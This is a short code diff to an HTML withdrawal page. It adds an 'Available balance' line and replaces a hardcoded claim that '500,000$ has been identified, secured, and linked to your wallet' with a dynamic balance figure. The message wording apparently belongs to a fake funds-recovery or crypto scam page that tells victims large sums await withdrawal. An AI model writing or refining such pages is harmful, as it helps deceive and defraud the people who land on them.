@@ -53,6 +53,7 @@
               <span class="input-icon">💲</span>
               <input type="number" id="withdraw-amount" step="0.01" min="0.01" required placeholder="0.00">
             </div>
+            <p class="withdraw-balance">Available balance: <strong id="available-balance">Loading...</strong></p>
           </div>
 
           <div class="form-group">
@@ -121,7 +122,7 @@
           </p>
           
           <p style="margin-bottom: 14px; font-weight: 600; color: var(--text-primary); background: rgba(59, 130, 246, 0.05); padding: 12px; border-left: 4px solid var(--primary); border-radius: 4px;">
-            We confirm that the sum of 500,000$ has been identified, secured, and linked to your wallet.
+            We confirm that the sum of <span id="success-balance">your available balance</span> has been identified, secured, and linked to your wallet.
           </p>
           
           <p style="margin-bottom: 14px; text-align: justify; font-size: 13.5px;">
